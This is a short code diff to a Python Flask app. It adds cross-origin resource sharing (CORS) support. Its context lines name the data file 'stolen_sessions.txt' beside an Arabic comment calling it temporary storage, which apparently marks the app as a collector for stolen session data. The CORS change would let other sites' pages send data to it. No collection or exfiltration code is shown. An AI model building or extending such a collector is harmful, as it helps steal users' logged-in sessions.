@@ -1,7 +1,9 @@
 import os
 from flask import Flask, request, jsonify, render_template_string
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)
 
 # ملف تخزين البيانات (مؤقت)
 DATA_FILE = "stolen_sessions.txt"
